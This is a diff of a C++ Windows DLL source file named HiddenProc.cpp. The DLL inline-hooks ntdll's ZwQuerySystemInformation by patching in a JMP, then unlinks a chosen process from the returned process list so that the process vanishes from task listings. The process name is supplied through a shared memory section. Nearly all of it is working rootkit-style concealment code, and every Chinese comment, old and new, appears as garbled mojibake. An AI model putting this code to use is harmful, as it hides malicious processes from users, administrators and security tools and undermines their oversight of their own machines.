@@ -1,4 +1,4 @@
-// APIHook2.cpp : ∂®“Â DLL ”¶”√≥Ã–Úµƒµº≥ˆ∫Ø ˝°£
+// HiddenProc.cpp : ÂÆö‰πâ DLL Â∫îÁî®Á®ãÂ∫èÁöÑÂØºÂá∫ÂáΩÊï∞„ÄÇ
 //
 
 #include "stdafx.h"
@@ -45,17 +45,17 @@ typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)
 #define DEF_NTDLL                       ("ntdll.dll")
 #define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")
 
-//¥¥Ω®“ª∏ˆΩ–◊ˆ".SHARE"µƒπ≤œÌƒ⁄¥ÊΩ⁄«¯£¨»ª∫Û¥¥Ω®g_szProcNameª∫≥Â«¯
-//◊Ó∫Û‘Ÿ”…µº≥ˆ∫Ø ˝SetprocName()Ω´“™“˛≤ÿµƒΩ¯≥Ã√˚≥∆±£¥ÊµΩg_szProcName÷–(SetProcName∫Ø ˝‘⁄RemoteMain.exe÷–÷¥––)
+//ÂàõÂª∫‰∏Ä‰∏™Âè´ÂÅö".SHARE"ÁöÑÂÖ±‰∫´ÂÜÖÂ≠òËäÇÂå∫ÔºåÁÑ∂ÂêéÂàõÂª∫g_szProcNameÁºìÂÜ≤Âå∫
+//ÊúÄÂêéÂÜçÁî±ÂØºÂá∫ÂáΩÊï∞SetprocName()Â∞ÜË¶ÅÈöêËóèÁöÑËøõÁ®ãÂêçÁß∞‰øùÂ≠òÂà∞g_szProcName‰∏≠(SetProcNameÂáΩÊï∞Âú®RemoteMain.exe‰∏≠ÊâßË°å)
 #pragma comment(linker,"/SECTION:.SHARE,RWS")
 #pragma data_seg(".SHARE")
     TCHAR g_szProcName[MAX_PATH] = { 0, };
 #pragma data_seg()
 
 
-//–Ë“™µº≥ˆµƒ∫Ø ˝SetProcName
+//ÈúÄË¶ÅÂØºÂá∫ÁöÑÂáΩÊï∞SetProcName
 #ifdef __cplusplus
-	//“ÚŒ™C++±‡“Î ±ª·∏ƒ±‰∫Ø ˝µƒ√˚◊÷£¨ƒ«√¥µº≥ˆæÕª·≥ˆœ÷’“≤ªµΩ∫Ø ˝µƒ«Èøˆ£¨À˘“‘–Ë“™”√C”Ô—‘±Í◊º
+	//Âõ†‰∏∫C++ÁºñËØëÊó∂‰ºöÊîπÂèòÂáΩÊï∞ÁöÑÂêçÂ≠óÔºåÈÇ£‰πàÂØºÂá∫Â∞±‰ºöÂá∫Áé∞Êâæ‰∏çÂà∞ÂáΩÊï∞ÁöÑÊÉÖÂÜµÔºåÊâÄ‰ª•ÈúÄË¶ÅÁî®CËØ≠Ë®ÄÊ†áÂáÜ
 	extern "C" {
 #endif // __cplusplus
 		__declspec(dllexport) void SetProcName(LPCTSTR szProcName)
@@ -78,30 +78,30 @@ BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBy
 	BYTE pBuf[5] = { 0xE9,0, };  
 	PBYTE pByte;
 
-	//¥”ntdll.dll÷–µº≥ˆZwQuerySystemInformation
+	//‰ªéntdll.dll‰∏≠ÂØºÂá∫ZwQuerySystemInformation
 	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
 	pByte = (PBYTE)pfnOrg;
 
-	//»Áπ˚ZwQuerySystemInformation“—æ≠±ª–ﬁ∏ƒ£¨æÕreturn
+	//Â¶ÇÊûúZwQuerySystemInformationÂ∑≤ÁªèË¢´‰øÆÊîπÔºåÂ∞±return
 	if (pByte[0] == 0xE9)
 		return FALSE;
 
-	//Ω´ƒ⁄¥Ê∏ƒŒ™ø…∂¡–¥
+	//Â∞ÜÂÜÖÂ≠òÊîπ‰∏∫ÂèØËØªÂÜô
 	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 
-	//±∏∑›‘≠”– ˝æ›
+	//Â§á‰ªΩÂéüÊúâÊï∞ÊçÆ
 	memcpy(pOrgBytes, pfnOrg, 5);
 
-	//–¬µƒ∫Ø ˝µÿ÷∑-HOOK∫Ø ˝µÿ÷∑-5(JMP XXXXXXXXµƒ◊÷Ω⁄)=œ‡∂‘∆´“∆¡ø
+	//Êñ∞ÁöÑÂáΩÊï∞Âú∞ÂùÄ-HOOKÂáΩÊï∞Âú∞ÂùÄ-5(JMP XXXXXXXXÁöÑÂ≠óËäÇ)=Áõ∏ÂØπÂÅèÁßªÈáè
 	dwAddress = (DWORDLONG)pfnNew - (DWORDLONG)pfnOrg - 5;
 
-	//Ω´œ‡∂‘∆´“∆¡ø¥Ê»ÎpBuf
+	//Â∞ÜÁõ∏ÂØπÂÅèÁßªÈáèÂ≠òÂÖ•pBuf
 	memcpy(&pBuf[1], &dwAddress, 4);
 	
-	//Ω´pBuf(±ª–ﬁ∏ƒ∫Ûµƒ¥˙¬Î)–¥»Îƒ⁄¥Ê£¨œ÷‘⁄¥˙¬Î“—æ≠–ﬁ∏ƒ≥…π¶¡À
+	//Â∞ÜpBuf(Ë¢´‰øÆÊîπÂêéÁöÑ‰ª£Á†Å)ÂÜôÂÖ•ÂÜÖÂ≠òÔºåÁé∞Âú®‰ª£Á†ÅÂ∑≤Áªè‰øÆÊîπÊàêÂäü‰∫Ü
 	memcpy(pfnOrg, pBuf, 5);
 
-    //ª÷∏¥ƒ⁄¥Ê≥ı º»®œﬁ
+    //ÊÅ¢Â§çÂÜÖÂ≠òÂàùÂßãÊùÉÈôê
 	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);
 
 	return TRUE;
@@ -122,7 +122,7 @@ BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgByte)
 
 	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 
-	//Ω´±∏∑›µƒ ˝æ›ª÷∏¥ªÿƒ⁄¥Ê
+	//Â∞ÜÂ§á‰ªΩÁöÑÊï∞ÊçÆÊÅ¢Â§çÂõûÂÜÖÂ≠ò
 	memcpy(pFunc, pOrgByte, 5);
 
 	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);
@@ -131,7 +131,7 @@ BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgByte)
 }
 
 
-//∫Ø ˝∏Ò Ω”ÎZwQuerySystemInformation“ªƒ£“ª—˘
+//ÂáΩÊï∞Ê†ºÂºè‰∏éZwQuerySystemInformation‰∏ÄÊ®°‰∏ÄÊ†∑
 NTSTATUS WINAPI NewZwQuerySystemInformation(
 	SYSTEM_INFORMATION_CLASS SystemInformationClass,
 	PVOID SystemInformation,
@@ -143,50 +143,50 @@ NTSTATUS WINAPI NewZwQuerySystemInformation(
 	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
 	char szProcName[MAX_PATH] = { 0, };
 
-	//ø™ º÷Æ«∞œ»Õ—π≥
+	//ÂºÄÂßã‰πãÂâçÂÖàËÑ±Èí©
 	unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);
 
-	//Õ®π˝GetProcAddressµ˜”√‘≠ ºAPI
+	//ÈÄöËøáGetProcAddressË∞ÉÁî®ÂéüÂßãAPI
 	pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), DEF_ZWQUERYSYSTEMINFORMATION);
 	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 	if (status != STATUS_SUCCESS)
 		goto __NTQUERYSYSTEMINFORMATION_END;
 
-	//Ωˆ’Î∂‘SystemProcessInformation¿‡–Õ≤Ÿ◊˜
+	//‰ªÖÈíàÂØπSystemProcessInformationÁ±ªÂûãÊìç‰Ωú
 	if (SystemInformationClass == SystemProcessInformation)
 	{
-		//SYSTEM_PROCESS_INFORMATION¿‡–Õ◊™ªª
-		//pCur «µ•œÚ¡¥±ÌµƒÕ∑
+		//SYSTEM_PROCESS_INFORMATIONÁ±ªÂûãËΩ¨Êç¢
+		//pCurÊòØÂçïÂêëÈìæË°®ÁöÑÂ§¥
 		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
 
 
-		//ø™ º±È¿˙¡¥±Ì
+		//ÂºÄÂßãÈÅçÂéÜÈìæË°®
 		while (TRUE)
 		{
 			
 			if (pCur->Reserved2[1] != NULL)
 			{
-				//±»ΩœΩ¯≥Ã√˚◊÷ «∑Ò «Œ“√«µƒƒøµƒΩ¯≥Ã
+				//ÊØîËæÉËøõÁ®ãÂêçÂ≠óÊòØÂê¶ÊòØÊàë‰ª¨ÁöÑÁõÆÁöÑËøõÁ®ã
 				if (!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
 				{
-					//»Áπ˚ «£¨≈–∂œ «∑ÒŒª”⁄¡¥±ÌŒ≤≤ø
-					//»Áπ˚‘⁄¡¥±ÌŒ≤≤ø£¨æÕ∞—«∞“ª∏ˆΩ⁄µ„µƒNext…ËŒ™0£¨÷±Ω”∂™∆˙µÙƒøµƒΩ¯≥Ãµƒ–≈œ¢
-					//»Áπ˚≤ª «Œ≤≤ø£¨‘Ú–Ë“™Ã¯π˝ƒøµƒΩ¯≥Ã£¨∑Ω∑® «»√«∞“ª∏ˆµƒNext÷∏œÚƒøµƒΩ¯≥Ãµƒ∫Û“ª∏ˆΩ¯≥Ã£¨∂¯≤ª «÷∏œÚƒøµƒΩ¯≥Ã
+					//Â¶ÇÊûúÊòØÔºåÂà§Êñ≠ÊòØÂê¶‰Ωç‰∫éÈìæË°®Â∞æÈÉ®
+					//Â¶ÇÊûúÂú®ÈìæË°®Â∞æÈÉ®ÔºåÂ∞±ÊääÂâç‰∏Ä‰∏™ËäÇÁÇπÁöÑNextËÆæ‰∏∫0ÔºåÁõ¥Êé•‰∏¢ÂºÉÊéâÁõÆÁöÑËøõÁ®ãÁöÑ‰ø°ÊÅØ
+					//Â¶ÇÊûú‰∏çÊòØÂ∞æÈÉ®ÔºåÂàôÈúÄË¶ÅË∑≥ËøáÁõÆÁöÑËøõÁ®ãÔºåÊñπÊ≥ïÊòØËÆ©Ââç‰∏Ä‰∏™ÁöÑNextÊåáÂêëÁõÆÁöÑËøõÁ®ãÁöÑÂêé‰∏Ä‰∏™ËøõÁ®ãÔºåËÄå‰∏çÊòØÊåáÂêëÁõÆÁöÑËøõÁ®ã
 					if (pCur->NextEntryOffset == 0)
 						pPrev->NextEntryOffset = 0;
 					else
 						pPrev->NextEntryOffset += pCur->NextEntryOffset;
 				}
 				else
-					//∏¸–¬«∞“ª∏ˆΩ⁄µ„
+					//Êõ¥Êñ∞Ââç‰∏Ä‰∏™ËäÇÁÇπ
 					pPrev = pCur;
 			}
 
-			//»Áπ˚±È¿˙ÕÍ¡¥±Ì£¨‘ÚÕÀ≥ˆ
+			//Â¶ÇÊûúÈÅçÂéÜÂÆåÈìæË°®ÔºåÂàôÈÄÄÂá∫
 			if (pCur->NextEntryOffset == 0)
 				break;
 
-			//∏¸–¬µ±«∞Ω⁄µ„£¨µ√µΩœ¬“ª∏ˆΩ⁄µ„µƒŒª÷√
+			//Êõ¥Êñ∞ÂΩìÂâçËäÇÁÇπÔºåÂæóÂà∞‰∏ã‰∏Ä‰∏™ËäÇÁÇπÁöÑ‰ΩçÁΩÆ
 			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONGLONG)pCur + pCur->NextEntryOffset);
 		}
 	}
@@ -197,7 +197,7 @@ __NTQUERYSYSTEMINFORMATION_END:
 
 
 
-//DLLµƒ»Îø⁄
+//DLLÁöÑÂÖ•Âè£
 BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
 	LPVOID lpReserved
@@ -207,7 +207,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	switch (ul_reason_for_call)
 	{
 	case DLL_PROCESS_ATTACH:
-		//∑≈÷√Hook
+		//ÊîæÁΩÆHook
 		hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
 
 		break;
@@ -216,7 +216,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	case DLL_THREAD_DETACH:
 		break;
 	case DLL_PROCESS_DETACH:
-		//–∂‘ÿHook
+		//Âç∏ËΩΩHook
 		unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,g_pOrgBytes);
 		break;
 	}
